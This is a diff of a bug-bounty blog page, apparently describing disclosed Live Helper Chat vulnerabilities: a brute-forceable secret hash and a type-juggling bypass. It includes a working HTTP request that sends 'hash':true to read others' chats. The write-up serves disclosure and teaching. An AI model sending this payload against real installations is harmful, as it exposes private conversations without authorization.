@@ -3,12 +3,14 @@
 <style>
 
 		@font-face { font-family: "gohu"; src: url("/gohu.woff") format('woff'); }
+		html {
+			background: url('/4rt3/g3n3r4t1v3/sketch_220308a/out.gif') no-repeat center/100% fixed;
+		}
 		body {
 			font-family: 'gohu', monospace;
 			max-width: 50em;
 			margin: 0 auto;
 			color: white;
-			background: black;
 			line-height: calc(1ex / 0.32);
 			margin-top: 3em;
 		}
@@ -88,56 +90,56 @@
 <p>When the Admin sees the "image" the SSRF will trigger, a nice little chain to prove impact.</p>
 <h2>Weak secret - <a href="https://huntr.dev/bounties/92f7b2d4-fa88-4c62-a2ee-721eebe01705/">CVE-2022-1235</a></h2>
 <p>The application used secretHash as a secret on lots of functionalities, but it was defined as :</p>
-<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?</span>
-<span class="nv">$cfgSite</span><span class="o">-&gt;</span><span class="na">setSetting</span><span class="p">(</span> <span class="s1">&#39;site&#39;</span><span class="p">,</span> <span class="s1">&#39;secrethash&#39;</span><span class="p">,</span> <span class="nb">substr</span><span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nb">time</span><span class="p">()</span> <span class="o">.</span> <span class="s2">&quot;:&quot;</span> <span class="o">.</span> <span class="nb">mt_rand</span><span class="p">()),</span><span class="mi">0</span><span class="p">,</span><span class="mi">10</span><span class="p">));</span>
-</code></pre></div>
+<pre class="codehilite"><code class="language-php">&lt;?
+$cfgSite-&gt;setSetting( 'site', 'secrethash', substr(md5(time() . &quot;:&quot; . mt_rand()),0,10));
+</code></pre>
 
 <p>10 characters of only hexadecimal, making 16^10 possilibities ( 1.099.511.627.776 ), totally brute-forceable. Also, don't use mt_rand, it's pretty broken. You can get an sha1 of it on the captcha :</p>
-<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?</span>
-<span class="nv">$hash</span> <span class="o">=</span> <span class="nb">sha1</span><span class="p">(</span><span class="nx">erLhcoreClassIPDetect</span><span class="o">::</span><span class="na">getIP</span><span class="p">()</span> <span class="o">.</span> <span class="nv">$Params</span><span class="p">[</span><span class="s1">&#39;user_parameters&#39;</span><span class="p">][</span><span class="s1">&#39;timets&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="nx">erConfigClassLhConfig</span><span class="o">::</span><span class="na">getInstance</span><span class="p">()</span><span class="o">-&gt;</span><span class="na">getSetting</span><span class="p">(</span> <span class="s1">&#39;site&#39;</span><span class="p">,</span> <span class="s1">&#39;secrethash&#39;</span> <span class="p">));</span>
-</code></pre></div>
+<pre class="codehilite"><code class="language-php">&lt;?
+$hash = sha1(erLhcoreClassIPDetect::getIP() . $Params['user_parameters']['timets'] . erConfigClassLhConfig::getInstance()-&gt;getSetting( 'site', 'secrethash' ));
+</code></pre>
 
 <p>You know every argument but the hash, pass it to hashcat and profit.</p>
 <p>For bug bounty, trying to guess how hashes are generated is a valid strategy, better if you can reverse engineer it on a mobile app or some javascript, found a couple of bugs that way.</p>
 <h2>Type Juggling 2 IDOR - <a href="https://huntr.dev/bounties/3e30171b-c9bf-415c-82f1-6f55a44d09d3/">CVE-2022-1176</a></h2>
 <p>The app used loose comparison on a security feature, if you have the hash you can read the content</p>
-<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?</span>
-    <span class="k">if</span> <span class="p">(</span><span class="nv">$chat</span> <span class="nx">instanceof</span> <span class="nx">erLhcoreClassModelChat</span> <span class="o">&amp;&amp;</span> <span class="nv">$chat</span><span class="o">-&gt;</span><span class="na">hash</span> <span class="o">==</span> <span class="nv">$requestPayload</span><span class="p">[</span><span class="s1">&#39;hash&#39;</span><span class="p">])</span>
-</code></pre></div>
+<pre class="codehilite"><code class="language-php">&lt;?
+    if ($chat instanceof erLhcoreClassModelChat &amp;&amp; $chat-&gt;hash == $requestPayload['hash'])
+</code></pre>
 
 <p>But it accepts JSON as input, oh no (ﾉಥ益ಥ)ﾉ</p>
-<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?</span>
-<span class="nv">$requestPayload</span> <span class="o">=</span> <span class="nb">json_decode</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">&#39;php://input&#39;</span><span class="p">),</span><span class="k">true</span><span class="p">);</span>
-</code></pre></div>
+<pre class="codehilite"><code class="language-php">&lt;?
+$requestPayload = json_decode(file_get_contents('php://input'),true);
+</code></pre>
 
 <p>just replace it to true and bypass the check (づ｡◕‿‿◕｡)づ</p>
-<div class="codehilite"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/eng/widgetrestapi/fetchmessages</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
-<span class="na">Host</span><span class="o">:</span> <span class="l">demo.livehelperchat.com</span>
-<span class="na">Cookie</span><span class="o">:</span> <span class="l">lhc_vid=eb9bc0c044919538c5b1</span>
-<span class="na">Content-Length</span><span class="o">:</span> <span class="l">62</span>
-<span class="na">Sec-Ch-Ua</span><span class="o">:</span> <span class="l">&quot;(Not(A:Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;99&quot;</span>
-<span class="na">Accept</span><span class="o">:</span> <span class="l">application/json, text/plain, */*</span>
-<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
-<span class="na">Sec-Ch-Ua-Mobile</span><span class="o">:</span> <span class="l">?0</span>
-<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36</span>
-<span class="na">Sec-Ch-Ua-Platform</span><span class="o">:</span> <span class="l">&quot;macOS&quot;</span>
-<span class="na">Origin</span><span class="o">:</span> <span class="l">https://demo.livehelperchat.com</span>
-<span class="na">Sec-Fetch-Site</span><span class="o">:</span> <span class="l">same-origin</span>
-<span class="na">Sec-Fetch-Mode</span><span class="o">:</span> <span class="l">cors</span>
-<span class="na">Sec-Fetch-Dest</span><span class="o">:</span> <span class="l">empty</span>
-<span class="na">Referer</span><span class="o">:</span> <span class="l">https://demo.livehelperchat.com/</span>
-<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
-<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7</span>
-<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
+<pre class="codehilite"><code>POST /eng/widgetrestapi/fetchmessages HTTP/1.1
+Host: demo.livehelperchat.com
+Cookie: lhc_vid=eb9bc0c044919538c5b1
+Content-Length: 62
+Sec-Ch-Ua: &quot;(Not(A:Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;99&quot;
+Accept: application/json, text/plain, */*
+Content-Type: application/x-www-form-urlencoded
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
+Sec-Ch-Ua-Platform: &quot;macOS&quot;
+Origin: https://demo.livehelperchat.com
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://demo.livehelperchat.com/
+Accept-Encoding: gzip, deflate
+Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close
 
-<span class="err">{</span>
-<span class="err">   &quot;chat_id&quot;:2,</span>
-<span class="err">   &quot;hash&quot;:true,</span>
-<span class="err">   &quot;lmgsid&quot;:1,</span>
-<span class="err">   &quot;theme&quot;:1,</span>
-<span class="err">   &quot;new_chat&quot;:true</span>
-<span class="err">}</span>
-</code></pre></div>
+{
+   &quot;chat_id&quot;:2,
+   &quot;hash&quot;:true,
+   &quot;lmgsid&quot;:1,
+   &quot;theme&quot;:1,
+   &quot;new_chat&quot;:true
+}
+</code></pre>
 
 <p>Every time I see a JSON now I'll put a true somewhere.</p>
 <h2>Closing thoughts</h2>
